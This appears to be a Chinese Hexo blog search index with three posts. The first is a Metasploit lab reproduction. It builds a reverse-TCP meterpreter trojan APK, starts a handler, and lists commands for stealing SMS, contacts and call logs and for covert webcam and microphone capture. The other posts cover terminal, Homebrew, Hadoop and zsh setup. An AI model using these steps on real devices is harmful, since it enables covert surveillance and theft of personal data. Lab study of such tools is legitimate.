<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>msf复现案例</title>
      <link href="/2020/11/26/msf-fu-xian-an-li/"/>
      <url>/2020/11/26/msf-fu-xian-an-li/</url>
      
        <content type="html"><![CDATA[<h1 id="安卓渗透"><a href="#安卓渗透" class="headerlink" title="安卓渗透"></a>安卓渗透</h1><p>环境:<br>Mac OS Mojave10.14.6(192.168.0.102): msf<br>MIPAD4(192.168.0.*): 已root</p><h2 id="生成带有木马的apk文件"><a href="#生成带有木马的apk文件" class="headerlink" title="生成带有木马的apk文件"></a>生成带有木马的apk文件</h2><p>打开 <strong>msfconsole</strong> 输入：</p><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>X LPORT<span class="token operator">=</span>4444 R <span class="token operator">></span> Y/text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/medias/msf/%E6%9C%A8%E9%A9%AC.png" alt></p><blockquote><p>其中X为主机IP(192.168.0.102)，Y为生成木马app的路径<br>LHOST 设置用来接收反弹连接的主机IP(192.168.0.102)<br>LPORT 设置用来接收反弹连接的kali端口(4444)</p></blockquote><p><img src="/medias/msf/app.png" alt><br>此处生成的app会被安卓系统的安全软件报毒，通过搜索使用免杀姿势可以解决。</p><h2 id="连接木马"><a href="#连接木马" class="headerlink" title="连接木马"></a>连接木马</h2><blockquote><p>此处需要对应的安卓系统和主机连接同一个局域网并且root<br>打开 <strong>msfconsole</strong> 再次输入:</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash">use exploit/multi/handler<span class="token keyword">set</span> PAYLOAD android/meterpreter/reverse_tcp<span class="token keyword">set</span> LHOST 192.168.0.102<span class="token keyword">set</span> LPORT 4444exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>等安卓系统安装完应用并打开:<br><img src="/medias/msf/%E6%88%90%E5%8A%9F.png" alt></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>cd –&gt;目录切换，命令：cd / 切换到根目录<br>search –&gt;搜索文件，命令：search text.jpg<br>download –&gt;下载文件，命令：download test.jpg<br>webcam_list –&gt;查看摄像头列表，因为手机都是前置和后置摄像头了<br>webcam_snap –&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1<br>webcam_stream –&gt;开启摄像头视频监控，同上，命令：webcam_stream -i<br>查看当前安卓是否已经root: check_root<br>下载通话记录: dump_calllog<br>下载短信记录: dump_contacts<br>下载通讯录: dump_sms<br>geolocate –&gt;利用谷歌地图定位（需要安装谷歌地图）</p><h2 id="核心命令："><a href="#核心命令：" class="headerlink" title="核心命令："></a>核心命令：</h2><p>============================</p><pre><code>Command      Description-------      -----------background          # Backgrounds the current sessionbgkill              # Kills a background meterpreter scriptbglist              # Lists running background scriptsbgrun               # Executes a meterpreter script as a background threadchannel             # Displays information or control active channelsclose               # Closes a channeldisable_unicode_encoding  # Disables encoding of unicode stringsenable_unicode_encoding   # Enables encoding of unicode stringsexit                 # Terminate the meterpreter sessionget_timeouts        #  Get the current session timeout valueshelp                #  Help menuinfo                # Displays information about a Post moduleirb                   Drop into irb scripting modeload                  Load one or more meterpreter extensionsmachine_id              Get the MSF ID of the machine attached to the sessionquit                  Terminate the meterpreter sessionread                  Reads data from a channelresource                Run the commands stored in a filerun                   Executes a meterpreter script or Post modulesess                  Quickly switch to another sessionset_timeouts            Set the current session timeout valuessleep                  Force Meterpreter to go quiet, then re-establish session.transport               Change the current transport mechanismuse                   Deprecated alias for &#39;load&#39;uuid                  Get the UUID for the current sessionwrite                  Writes data to a channel</code></pre><h2 id="Stdapi-File-system-Commands"><a href="#Stdapi-File-system-Commands" class="headerlink" title="Stdapi: File system Commands"></a>Stdapi: File system Commands</h2><p>============================</p><pre><code>Command      Description-------      -----------cat         Read the contents of a file to the screencd          Change directorychecksum      Retrieve the checksum of a filedir         List files (alias for ls)download      Download a file or directoryedit        Edit a filegetlwd       Print local working directorygetwd        Print working directorylcd         Change local working directorylpwd        Print local working directoryls          List filesmkdir        Make directorypwd         Print working directoryrm          Delete the specified filermdir        Remove directorysearch       Search for filesupload       Upload a file or directory</code></pre><h2 id="Stdapi-Networking-Commands"><a href="#Stdapi-Networking-Commands" class="headerlink" title="Stdapi: Networking Commands"></a>Stdapi: Networking Commands</h2><p>===========================</p><pre><code>Command      Description-------      -----------ifconfig      Display interfacesipconfig      Display interfacesportfwd       Forward a local port to a remote serviceroute        View and modify the routing table</code></pre><h2 id="Stdapi-System-Commands"><a href="#Stdapi-System-Commands" class="headerlink" title="Stdapi: System Commands"></a>Stdapi: System Commands</h2><p>=======================</p><pre><code>Command      Description-------      -----------execute       Execute a commandgetuid       Get the user that the server is running aslocaltime     Displays the target system&#39;s local date and timeps          List running processesshell        Drop into a system command shellsysinfo       Gets information about the remote system, such as OS</code></pre><h2 id="Stdapi-Webcam-Commands"><a href="#Stdapi-Webcam-Commands" class="headerlink" title="Stdapi: Webcam Commands"></a>Stdapi: Webcam Commands</h2><p>=======================</p><pre><code>Command       Description-------       -----------record_mic     Record audio from the default microphone for X seconds           打开麦克风录音webcam_chat    Start a video chatwebcam_list    List webcams                                                                      显示有多少个摄像头webcam_snap    Take a snapshot from the specified webcam                          拍照webcam_stream  Play a video stream from the specified webcam</code></pre><h2 id="Android-Commands"><a href="#Android-Commands" class="headerlink" title="Android Commands"></a>Android Commands</h2><p>================</p><pre><code>Command          Description-------          -----------activity_start    Start an Android activity from a Uri string                            打开某个网址的安卓程序check_root       Check if device is rooted                                                  查看是否ROOTdump_calllog      Get call log                                                                  取得通话记录dump_contacts     Get contacts list                                                          取得通信录dump_sms         Get sms messages                                                         取得短信记录geolocate        Get current lat-long using geolocation                                取得地理位置信息interval_collect  Manage interval collection capabilitiessend_sms         Sends SMS from target session                                          发送短信（实验不成功）set_audio_mode    Set Ringer Mode                                                         调整铃声大小sqlite_query      Query a SQLite database from storagewlan_geolocate    Get current lat-long using WLAN information</code></pre><h1 id="windows渗透"><a href="#windows渗透" class="headerlink" title="windows渗透"></a>windows渗透</h1><h2 id="永恒之蓝ms17-010"><a href="#永恒之蓝ms17-010" class="headerlink" title="永恒之蓝ms17-010"></a>永恒之蓝ms17-010</h2><h2 id="officeCVE-2017-11882"><a href="#officeCVE-2017-11882" class="headerlink" title="officeCVE-2017-11882"></a>officeCVE-2017-11882</h2><p><a href="https://www.sqlsec.com/2020/10/office.html" target="_blank" rel="noopener">参考国光</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm2终端配置及美化</title>
      <link href="/2020/11/08/iterm2-zhong-duan-pei-zhi-ji-mei-hua/"/>
      <url>/2020/11/08/iterm2-zhong-duan-pei-zhi-ji-mei-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="软件设置"><a href="#软件设置" class="headerlink" title="软件设置"></a>软件设置</h1><p>主要设置颜色，窗口和字体。<br><img src="/medias/iTerm2/1.png" alt><br><img src="/medias/iTerm2/2.png" alt><br><img src="/medias/iTerm2/3.png" alt></p><h1 id="安装Homebrew"><a href="#安装Homebrew" class="headerlink" title="安装Homebrew"></a>安装Homebrew</h1><h2 id="安装（挂梯子）"><a href="#安装（挂梯子）" class="headerlink" title="安装（挂梯子）"></a>安装（挂梯子）</h2><pre class="line-numbers language-bash"><code class="language-bash">/usr/bin/ruby -e <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span class="token variable">)</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> -R <span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span> /usr/local/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="换源："><a href="#换源：" class="headerlink" title="换源："></a>换源：</h2><h3 id="brew换源"><a href="#brew换源" class="headerlink" title="brew换源"></a>brew换源</h3><pre class="line-numbers language-bash"><code class="language-bash">// 1.替换brew.git:$ <span class="token function">cd</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span>brew --repo<span class="token variable">)</span></span>"</span>// 中国科大:$ <span class="token function">git</span> remote set-url origin https://mirrors.ustc.edu.cn/brew.git// 清华大学:$ <span class="token function">git</span> remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git// 2.替换homebrew-core.git:$ <span class="token function">cd</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span>brew --repo<span class="token variable">)</span></span>/Library/Taps/homebrew/homebrew-core"</span>// 中国科大:$ <span class="token function">git</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git// 清华大学: <span class="token function">git</span> remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git// 3.替换homebrew-bottles:// 中国科大:$ <span class="token keyword">echo</span> <span class="token string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> <span class="token operator">>></span> ~/.bash_profile$ <span class="token function">source</span> ~/.bash_profile// 清华大学:$ <span class="token keyword">echo</span> <span class="token string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles'</span> <span class="token operator">>></span> ~/.bash_profile$ <span class="token function">source</span> ~/.bash_profile// 4.应用生效:$ brew update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h1><h2 id="Hexo博客相关"><a href="#Hexo博客相关" class="headerlink" title="Hexo博客相关"></a>Hexo博客相关</h2><h3 id="安装get"><a href="#安装get" class="headerlink" title="安装get"></a>安装get</h3><p><code>brew install git</code><br>报错：<br>使用git出现<br>missing xcrun at: /Library/Developer/CommandLineTools/usr/bin/xcrun，即找不到xcrun文件。<br>这是因为没安装xcode命令行工具。<br>终端输入：xcode-select –install<br><img src="/medias/iTerm2/xcode.png" alt></p><h3 id="安装nvm"><a href="#安装nvm" class="headerlink" title="安装nvm"></a>安装nvm</h3><blockquote><p>node和npm版本管理工具</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token comment" spellcheck="true">## 安装nvm</span>   curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/ install.sh <span class="token operator">|</span> <span class="token function">bash</span>   <span class="token comment" spellcheck="true">## ~/.zshrc中添加</span><span class="token function">export</span> NVM_DIR<span class="token operator">=</span><span class="token string">"<span class="token variable">$HOME</span>/.nvm"</span><span class="token punctuation">[</span> -s <span class="token string">"<span class="token variable">$NVM_DIR</span>/nvm.sh"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> \. <span class="token string">"<span class="token variable">$NVM_DIR</span>/nvm.sh"</span><span class="token punctuation">[</span> -s <span class="token string">"<span class="token variable">$NVM_DIR</span>/bash_completion"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> \. <span class="token string">"<span class="token variable">$NVM_DIR</span>/bash_completion"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证是否安装成功: <code>nvm --version</code></p><p>基本操作：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查看当前 node 的版本</span>nvm version <span class="token comment" spellcheck="true"># 安装最新稳定版 node</span>nvm <span class="token function">install</span> stable<span class="token comment" spellcheck="true"># 列出所有远程服务器的版本</span>nvm ls-remote<span class="token comment" spellcheck="true"># 安装指定版本</span><span class="token function">npm</span> <span class="token function">install</span> v12.18.1nvm <span class="token function">install</span> <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token comment" spellcheck="true"># 列出所有已安装的版本</span>nvm <span class="token function">ls</span><span class="token comment" spellcheck="true"># 卸载指定的版本</span>nvm uninstall <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token comment" spellcheck="true"># 切换使用指定的版本node</span>nvm use <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token comment" spellcheck="true"># 显示当前的版本</span>nvm current<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中node版本不能过高（实测V14以上报错）否则：<br><img src="/medias/iTerm2/%E6%8A%A5%E9%94%99.png" alt><br>解决办法：降低node版本（小于v12.14.0实测可行）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 列出所有版本node</span>nvm ls-remote<span class="token comment" spellcheck="true">## 安装指定版本</span>nvm <span class="token function">install</span> <span class="token operator">&lt;</span>version<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p> <code>npm install hexo-cli -g</code></p><h2 id="python相关"><a href="#python相关" class="headerlink" title="python相关"></a>python相关</h2><h3 id="安装pip3"><a href="#安装pip3" class="headerlink" title="安装pip3"></a>安装pip3</h3><p> <code>sudo easy_install pip</code></p><h4 id="pip换源。"><a href="#pip换源。" class="headerlink" title="pip换源。"></a>pip换源。</h4><p><strong>1.查看根目录是否有.pip文件夹，没有就新建一个，然后在.pip 文件夹内新建一个pip.conf文件。</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -a //查看<span class="token function">mkdir</span> .pip//新建文件夹<span class="token function">touch</span> pip.conf//新建文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>2.粘贴代码到pip.conf</strong></p><pre class="line-numbers language-bash"><code class="language-bash">//阿里<span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> http://mirrors.aliyun.com/pypi/simple/<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host<span class="token operator">=</span>mirrors.aliyun.com//豆瓣<span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> http://pypi.douban.com/simple<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host<span class="token operator">=</span>pypi.douban.com//清华（推荐）<span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> https://pypi.tuna.tsinghua.edu.cn/simple<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host<span class="token operator">=</span>pypi.tuna.tsinghua.edu.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h3><p> <code>brew install python3</code></p><p><em>报错：</em>ModuleNotFoundError: No module named ‘PIL’<br><em>解决方法</em><br>运行安装pillow命令:</p><pre class="line-numbers language-bash"><code class="language-bash">pip <span class="token function">install</span> pillow//如果运行时显示Requirement already satisfied: pillow <span class="token keyword">in</span> /anaconda3/lib/python3.7/site-packages <span class="token punctuation">(</span>5.4.1<span class="token punctuation">)</span>//表示已经安装过了，这时可以先卸载，获取最新的pillow//运行卸载命令: pip uninstall pillow//然后再次运行安装命令pip <span class="token function">install</span> pillow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="安装aircrack-ng"><a href="#安装aircrack-ng" class="headerlink" title="安装aircrack-ng"></a>安装aircrack-ng</h3><p> <code>brew install aircrack-ng</code></p><h3 id="安装wget"><a href="#安装wget" class="headerlink" title="安装wget"></a>安装wget</h3><p> <code>brew install wget</code></p><h3 id="安装-on-my-zsh"><a href="#安装-on-my-zsh" class="headerlink" title="安装 on-my-zsh"></a>安装 on-my-zsh</h3><ul><li><p>手动：</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token function">git</span> clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh   <span class="token function">cp</span> ~/.zshrc ~/.zshrc.orig   <span class="token function">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc   chsh -s /bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>自动安装：</p></li></ul><pre class="line-numbers language-bash"><code class="language-bash">brew <span class="token function">install</span> zsh<span class="token comment" spellcheck="true">## 或者</span>    <span class="token function">wget</span> https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - <span class="token operator">|</span> sh<span class="token comment" spellcheck="true">## 或者</span>    sh -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>了解on-my-zsh目录结构<br><img src="/medias/iTerm2/tree.png" alt></li></ul><blockquote><p>lib 提供核心功能脚本库<br>tools 提供安装、升级等功能的快捷工具<br>plugins 自带插件的存在放位置<br>templates 自带模板的存在放位置<br>themes 自带主题文件的存在放位置<br>custom 个性化配置目录，自安装的插件和主题可放这里（.zsh）</p></blockquote><ul><li><ol start="4"><li>配置文件<br>打开<code>vim ~/.zshrc</code><br>ZSH_THEME 即为 oh-my-zsh 的主题配置<br>plugins 为自添加插件配置（对应plugins）。<br>卸载 ：<code>uninstall_oh_my_zsh</code></li></ol></li></ul><h3 id="配置hadoop-hadoop2-7-1-hbase1-4-3"><a href="#配置hadoop-hadoop2-7-1-hbase1-4-3" class="headerlink" title="配置hadoop(hadoop2.7.1 + hbase1.4.3)"></a>配置hadoop(hadoop2.7.1 + hbase1.4.3)</h3><h4 id="1-配置ssh免密登录"><a href="#1-配置ssh免密登录" class="headerlink" title="1.配置ssh免密登录"></a>1.配置ssh免密登录</h4><p> 在系统偏好设置–&gt;共享–&gt;远程登录 勾选所有用户就以使用ssh。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 设置密钥</span>ssh-keygen -t rsa -P <span class="token string">''</span> -f ~/.ssh/id_rsa<span class="token function">cat</span> ~/.ssh/id_rsa.pub <span class="token operator">>></span> ~/.ssh/authorized_keys<span class="token function">chmod</span> 0600 ~/.ssh/authorized_keys<span class="token comment" spellcheck="true">## 测试</span><span class="token function">ssh</span> localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-hadoop单机安装"><a href="#2-hadoop单机安装" class="headerlink" title="2.hadoop单机安装"></a>2.hadoop单机安装</h4><p><a href="https://archive.apache.org/dist/hadoop/common/hadoop-2.7.1/?C=N;O=D" target="_blank" rel="noopener">hadoop历史版本下载</a>。<br>下载<strong>hadoop2.7.1</strong>版本重命名存放在：<code>/usr/local/Cellar/hadoop</code>中。<br>修改配置文件</p><p>测试:<br>至此单机模式就安装好了。（没有使用hdfs，而是直接用本地文件系统）</p><h4 id="3-伪分布式配置"><a href="#3-伪分布式配置" class="headerlink" title="3.伪分布式配置"></a>3.伪分布式配置</h4><p>配置文件位于 <code>/usr/local/Cellar/hadoop/XXXX/libexec/etc/hadoop</code>下的配置文件。</p><ul><li><p>hadoop-env.sh<br>加入<code>export JAVA_HOME = [java的home路径]</code><br>其中java的home路径可通过<code>/usr/libexec/java_home</code>查看。</p></li><li><p>core-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash">  <span class="token operator">&lt;</span>configuration<span class="token operator">></span>      <span class="token operator">&lt;</span>property<span class="token operator">></span>           <span class="token operator">&lt;</span>name<span class="token operator">></span>fs.defaultFS<span class="token operator">&lt;</span>/name<span class="token operator">></span>           <span class="token operator">&lt;</span>value<span class="token operator">></span>hdfs://localhost:9000<span class="token operator">&lt;</span>/value<span class="token operator">></span>       <span class="token operator">&lt;</span>/property<span class="token operator">></span>  <span class="token operator">&lt;</span>/configuration<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hdfs-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash">    <span class="token operator">&lt;</span>configuration<span class="token operator">></span>      <span class="token operator">&lt;</span>property<span class="token operator">></span>           <span class="token operator">&lt;</span>name<span class="token operator">></span>dfs.replication<span class="token operator">&lt;</span>/name<span class="token operator">></span>           <span class="token operator">&lt;</span>value<span class="token operator">></span>1<span class="token operator">&lt;</span>/value<span class="token operator">></span>       <span class="token operator">&lt;</span>/property<span class="token operator">></span>       <span class="token operator">&lt;</span>/configuration<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>mapred-site.xml（去掉<code>.example</code>）</p><pre class="line-numbers language-bash"><code class="language-bash">  <span class="token operator">&lt;</span>configuration<span class="token operator">></span>      <span class="token operator">&lt;</span>property<span class="token operator">></span>           <span class="token operator">&lt;</span>name<span class="token operator">></span>mapreduce.framework.name<span class="token operator">&lt;</span>/name<span class="token operator">></span>           <span class="token operator">&lt;</span>value<span class="token operator">></span>yarn<span class="token operator">&lt;</span>/value<span class="token operator">></span>       <span class="token operator">&lt;</span>/property<span class="token operator">></span>  <span class="token operator">&lt;</span>/configuration<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>yarn-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash">  <span class="token operator">&lt;</span>configuration<span class="token operator">></span>      <span class="token operator">&lt;</span>property<span class="token operator">></span>           <span class="token operator">&lt;</span>name<span class="token operator">></span>yarn.nodemanager.aux-services<span class="token operator">&lt;</span>/name<span class="token operator">></span>           <span class="token operator">&lt;</span>value<span class="token operator">></span>mapreduce_shuffle<span class="token operator">&lt;</span>/value<span class="token operator">></span>       <span class="token operator">&lt;</span>/property<span class="token operator">></span>      <span class="token operator">&lt;</span>property<span class="token operator">></span>           <span class="token operator">&lt;</span>name<span class="token operator">></span>yarn.nodemanager.env-whitelist<span class="token operator">&lt;</span>/name<span class="token operator">></span>                    <span class="token operator">&lt;</span>value<span class="token operator">></span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME<span class="token operator">&lt;</span>/value<span class="token operator">></span>      <span class="token operator">&lt;</span>/property<span class="token operator">></span>  <span class="token operator">&lt;</span>/configuration<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="4-启动"><a href="#4-启动" class="headerlink" title="4.启动"></a>4.启动</h4><ul><li>进入/usr/local/Cellar/hadoop/XXX/bin：<br> 执行<code>hdfs namenode -format</code>初始化hdfs文件系统<br><img src="/medias/iTerm2/hdfs.png" alt></li><li>修改配置文件<code>~/.zshrc</code>:</li></ul><pre><code>        # hadoop        export PATH=&quot;$PATH:/usr/local/Cellar/hadoop/XXX/sbin&quot;</code></pre><ol><li>启动NameNode和datanode: <code>start-dfs.sh</code>。成功可访问：<a href="http://localhost:9870" target="_blank" rel="noopener">http://localhost:9870</a></li><li>启动 ResourceManager 和 NodeManager:<code>start-yarn.sh</code>。成功可访问: <a href="http://localhost:8088" target="_blank" rel="noopener">http://localhost:8088</a></li><li>jps查看系统java进程：<br><img src="/medias/iTerm2/jps.png" alt><br>显示这五个表示安装正常。</li><li>或者直接 start-all.sh/stop-all.sh 一键启动/一键停止</li></ol><ul><li>报错<br>  警告：WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform… using builtin-java classes where applicable 对Hadoop的运行没有影响<br>  后续的每次启动namenode都启动失败。<br>原因是因为每次关机tmp都会被清空，此时需要手动执行<code>hdfs namenode -format</code>初始化hdfs文件系统。解决办法网上有，此处不解决。</li></ul><h3 id="安装Hadoop-Hbase"><a href="#安装Hadoop-Hbase" class="headerlink" title="安装Hadoop-Hbase"></a>安装Hadoop-Hbase</h3><p>参考：<a href="https://www.jianshu.com/p/510e1d599123" target="_blank" rel="noopener">Hbase安装</a></p><h3 id="安装ettercap（arp欺骗工具）"><a href="#安装ettercap（arp欺骗工具）" class="headerlink" title="安装ettercap（arp欺骗工具）"></a>安装ettercap（arp欺骗工具）</h3><pre class="line-numbers language-bash"><code class="language-bash">brew <span class="token function">install</span> ettercap<span class="token comment" spellcheck="true">## 图形界面</span>ettercap -C  图形界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="安装ADB调试桥，以使用冰箱。"><a href="#安装ADB调试桥，以使用冰箱。" class="headerlink" title="安装ADB调试桥，以使用冰箱。"></a>安装ADB调试桥，以使用冰箱。</h3><p><strong>1.安装</strong><br>输入<code>adb</code>检查是否已经安装。若显示没安装<br>则：</p><blockquote><p>仅仅需要一个<code>platform-tools</code>文件夹</p></blockquote><ul><li>方法一：因为安卓开发环境需要用到adb，安装过studio等软件的都自带的有<code>platform-tools</code>，它在<code>~/Library/Android/sdk/platform-tools</code>下，</li><li>方法二：<a href="https://developer.android.com/studio/releases/platform-tools.html" target="_blank" rel="noopener">简单粗暴，官网下载</a>,下载<code>platform-tools</code>文件夹。</li><li>方法三：先保证有brew包管理器，再执行<code>brew cask install android-platform-tools</code>即可。</li><li><em>2.配置环境变量*</em><br>为方便adb的使用，添加环境变量。<br>iTerm输入<code>open -e .bash_profile</code>,打开配置文件。<br>添加<code>export PATH=${PATH}:~/Library/Android/sdk/platform-tools</code>即可。</li><li><em>3.冰箱的具体教程根据官方文档使用*</em><br><a href="https://github.com/heruoxin/Ice-Box-Docs" target="_blank" rel="noopener">项目地址</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置你的zsh与bash</title>
      <link href="/2020/11/08/pei-zhi-ni-de-zsh-yu-bash/"/>
      <url>/2020/11/08/pei-zhi-ni-de-zsh-yu-bash/</url>
      
        <content type="html"><![CDATA[<h1 id="zsh配置文件"><a href="#zsh配置文件" class="headerlink" title="zsh配置文件"></a>zsh配置文件</h1><blockquote><p>zsh是Bourne Shell(sh)的一个变种。Mac OS X 10.3之后默认的是Bourne Shell（bash/sh/zsh），之前为C Shell（csh/tcsh），通过zsh配合oh-my-zsh可以实现非常惊艳的效果。<br>zsh又被称为终极shell,可见其强大之处。</p></blockquote><p>附上我美化后的终端：<br><img src="/medias/mac%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/%E7%BB%88%E7%AB%AF.png" alt><br>想了解美化的具体过程可参考<a href="https://blog.csdn.net/sfhawx/article/details/49969321" title="iTerm2终端美化" target="_blank" rel="noopener">iTerm2终端美化</a></p><blockquote><p>对于zsh我们主要关心的配置文件有  <code>zshenv</code> ， <code>zprofile</code> ， <code>zshrc</code> ， <code>zlogin</code> ， <code>zlogout</code>。</p></blockquote><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p>zsh的五个配置文件分两份存储，即用户根目录home下的隐藏形式<code>~/.XXXX</code>和linux根目录下的非隐藏形式<code>/etc/XXXX</code>。<br><strong><code>/etc</code>里的是全局的，对所有用户起作用。用户家目录中的只对当前用户有效果。</strong></p><blockquote><p>MAC OS 可通过 <code>shift + command + .</code> 来显示隐藏文件（.XXXX）。</p></blockquote><p><img src="/medias/mac%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA.png" alt><br>而通过实际的查看我们发现，我的目录中只有 <code>zshrc</code>一个文件，也就是说此时只加载<code>zshrc</code>。</p><h2 id="加载顺序"><a href="#加载顺序" class="headerlink" title="加载顺序"></a>加载顺序</h2><p>配置文件的位置我们知道了，那么如何确定他们的加载顺序呢，我们只需要在用户根目录home下的五个配置文件（没有的话自行创建）中分别加入一句话： </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'.XXXX'</span> <span class="token operator">>></span> /Users/YYYY/Desktop/1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将信息打印输出到桌面的 ’ <code>1</code> ‘文件中。</p><blockquote><p>其中：XXXX是配置文件的名称，YYYY为用户名。</p></blockquote><p>结果如下：<br><img src="/medias/mac%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/%E7%BB%93%E6%9E%9C.png" alt></p><p>由此可得加载顺序为：<code>.zshenv</code> → <code>.zprofile</code> → <code>.zshrc</code> → <code>.zlogin</code> → <code>.zlogout</code> 。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>以下引用自网络。</p><ul><li>.zshenv总是被读取,所以通常把$PATH, 